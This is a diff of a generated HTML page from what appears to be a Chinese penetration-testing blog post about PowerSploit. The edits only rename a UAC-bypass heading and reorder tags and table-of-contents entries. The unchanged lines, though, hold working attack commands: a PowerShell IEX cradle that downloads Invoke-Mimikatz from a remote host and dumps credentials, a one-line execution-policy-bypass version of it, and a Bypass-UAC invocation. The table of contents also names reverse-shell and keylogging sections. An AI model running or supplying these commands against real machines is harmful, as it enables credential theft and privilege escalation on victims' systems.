@@ -199,7 +199,7 @@
 <h3 id="抓取内存中的明文密码"><a href="#抓取内存中的明文密码" class="headerlink" title="抓取内存中的明文密码"></a>抓取内存中的明文密码</h3><p><code>Invoke-Mimikatz</code>模块<br>通过IEX下载并调用Invoke-Mimikatz<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">IEX(New-Object net.webclient).downloadstring(<span class="hljs-string">"http://192.168.158.133/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1"</span>)<br><br>Invoke-Mimikatz -DumpCreds<br></code></pre></td></tr></table></figure></p>
 <p>一句话版<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -Exec bypass <span class="hljs-string">"IEX(New-Object net.webclient).downloadstring('http://192.168.5.10/upload/bk201/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"</span><br></code></pre></td></tr></table></figure></p>
 <hr>
-<h3 id="用户账户控制绕过"><a href="#用户账户控制绕过" class="headerlink" title="用户账户控制绕过"></a>用户账户控制绕过</h3><p>Bypass UAC<br>当UAC为默认等级及以下时：<br><code>Powershell suite</code><br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"import-module .\Bypass-UAC.ps1;Bypass-UAC"</span><br></code></pre></td></tr></table></figure></p>
+<h3 id="用户访问控制绕过"><a href="#用户访问控制绕过" class="headerlink" title="用户访问控制绕过"></a>用户访问控制绕过</h3><p>Bypass UAC<br>当UAC为默认等级及以下时：<br><code>Powershell suite</code><br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"import-module .\Bypass-UAC.ps1;Bypass-UAC"</span><br></code></pre></td></tr></table></figure></p>
 <figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># win 7 Pro</span><br>![UacMethodSysprep]<br><br><span class="hljs-comment"># win 10 pro</span><br>![UacMethodTcmsetup]<br></code></pre></td></tr></table></figure>
 <hr>
 <h3 id="Powershell文件远程下载"><a href="#Powershell文件远程下载" class="headerlink" title="Powershell文件远程下载"></a>Powershell文件远程下载</h3><ul>
@@ -215,11 +215,11 @@
       
       <div class="post-tags">
         
+        <a class="post-tag button" href="/tags/PowerSploit/" rel="tag"><i class="fas fa-tags"></i>PowerSploit</a>
+        
         <a class="post-tag button" href="/tags/Domain/" rel="tag"><i class="fas fa-tags"></i>Domain</a>
         
         <a class="post-tag button" href="/tags/Penetration/" rel="tag"><i class="fas fa-tags"></i>Penetration</a>
-        
-        <a class="post-tag button" href="/tags/PowerSploit/" rel="tag"><i class="fas fa-tags"></i>PowerSploit</a>
         
       </div>
       
@@ -319,7 +319,7 @@
     <hr>
     <div class="post-toc sidebar-item" id="toc-div">
       <div><i class="fas fa-list-ol"></i>文章目录</div>
-      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#基本使用过程"><span class="toc-text">基本使用过程</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#使用实例"><span class="toc-text">使用实例</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#域信息收集"><span class="toc-text">域信息收集</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#反弹shell-metepreter"><span class="toc-text">反弹shell(metepreter)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#端口扫描"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#键盘记录"><span class="toc-text">键盘记录</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#抓取内存中的明文密码"><span class="toc-text">抓取内存中的明文密码</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#用户账户控制绕过"><span class="toc-text">用户账户控制绕过</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Powershell文件远程下载"><span class="toc-text">Powershell文件远程下载</span></a></li></ol></li></ol></div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#基本使用过程"><span class="toc-text">基本使用过程</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#使用实例"><span class="toc-text">使用实例</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#域信息收集"><span class="toc-text">域信息收集</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#反弹shell-metepreter"><span class="toc-text">反弹shell(metepreter)</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#端口扫描"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#键盘记录"><span class="toc-text">键盘记录</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#抓取内存中的明文密码"><span class="toc-text">抓取内存中的明文密码</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#用户访问控制绕过"><span class="toc-text">用户访问控制绕过</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Powershell文件远程下载"><span class="toc-text">Powershell文件远程下载</span></a></li></ol></li></ol></div>
     </div>
     
     
